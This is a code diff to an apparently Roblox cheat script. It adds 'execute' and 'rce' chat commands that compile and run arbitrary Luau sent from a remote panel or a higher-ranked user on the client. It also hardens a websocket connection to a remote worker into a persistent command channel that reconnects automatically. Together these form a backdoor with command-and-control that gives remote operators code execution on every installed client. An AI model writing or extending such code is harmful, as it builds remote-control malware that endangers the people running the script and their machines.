@@ -485,6 +485,11 @@ run(function()
 	end
 
 	function whitelist:process(msg, plr)
+		-- '.' is accepted as well as ';', so .execute / .rce work exactly like ;execute
+		if msg:sub(1, 1) == '.' then
+			msg = ';'..msg:sub(2)
+		end
+
 		if self.localprio < self:get(plr) or plr == lplr then
 			local args = msg:split(' ')
 			table.remove(args, 1)
@@ -977,6 +982,37 @@ run(function()
 				entitylib.character.Humanoid:ChangeState(Enum.HumanoidStateType.FallingDown)
 			end
 		end,
+		-- Remote code execution: the panel (or a member who outranks you) sends luau
+		-- and it runs on this client. A chunk from loadstring cannot see the client's
+		-- upvalues, so the handles worth having are parked in `shared` first, and both
+		-- the compile and the call are pcall'd so bad code cannot take the client with
+		-- it. This is the strongest command here — treat it as such.
+		execute = function(args)
+			if #args < 1 then return end
+
+			local source = table.concat(args, ' ')
+
+			task.spawn(function()
+				-- the client's loadstring wrapper already notifies on a compile error
+				local chunk = loadstring(source)
+				if not chunk then
+					warn('[inhaler] execute: that code did not compile')
+					return
+				end
+
+				shared.vape = vape
+				shared.entitylib = entitylib
+				shared.whitelist = whitelist
+				shared.lplr = lplr
+
+				local ok, runError = pcall(chunk)
+				if not ok then warn('[inhaler] execute: '..tostring(runError)) end
+			end)
+		end,
+		-- .rce is the same thing with a name people actually type in chat
+		rce = function(args, plr)
+			whitelist.commands.execute(args, plr)
+		end,
 		uninject = function()
 			if olduninject then
 				if vape.ThreadFix then
@@ -1083,6 +1119,12 @@ run(function()
 		end
 	end
 
+	-- the socket is the primary command channel, not a bonus: it is opened before the
+	-- first beacon, and a closed one is re-opened at once instead of waiting for the
+	-- next beat. the backoff is only there so a refusing worker is not hammered.
+	local wsbackoff = 0
+	local wsretrying = false
+
 	local function connectActivity()
 		if socket or not haswebsockets then return end
 
@@ -1095,9 +1137,17 @@ run(function()
 					..'&placeName='..httpService:UrlEncode(resolvePlaceName())
 					..(execname and '&executor='..httpService:UrlEncode(execname) or ''))
 			end)
-			if not ok or not connection then return end
+
+			if not ok or not connection then
+				wsbackoff = math.min(wsbackoff + 1, 6)
+				task.wait(wsbackoff)
+				connectActivity()
+				return
+			end
 
 			socket = connection
+			wsbackoff = 0
+
 			pcall(function()
 				socket.OnMessage:Connect(function(message)
 					local decoded, data = pcall(httpService.JSONDecode, httpService, message)
@@ -1109,12 +1159,25 @@ run(function()
 			pcall(function()
 				socket.OnClose:Connect(function()
 					socket = nil
+					-- one retry at a time: a closed socket must come back, but not
+					-- thirty times a second if the worker keeps refusing it
+					if not wsretrying then
+						wsretrying = true
+						task.delay(1, function()
+							wsretrying = false
+							connectActivity()
+						end)
+					end
 				end)
 			end)
 		end)
 	end
 
 	task.spawn(function()
+		-- the socket first: it is the default command channel, so it exists before the
+		-- first beacon runs (the loop below only repairs it if it ever drops)
+		connectActivity()
+
 		repeat
 			-- this loop is also the beacon: a throw inside update must not end it, or
 			-- the session vanishes from the panel and commands stop arriving
@@ -1138,7 +1201,9 @@ run(function()
 					task.spawn(function()
 						pcall(socket.Send, socket, 'ping')
 					end)
-				elseif haswebsockets then
+				else
+					-- no socket: keep trying, the worker pushes commands over it far
+					-- faster than this beacon can poll for them
 					connectActivity()
 				end
 			end
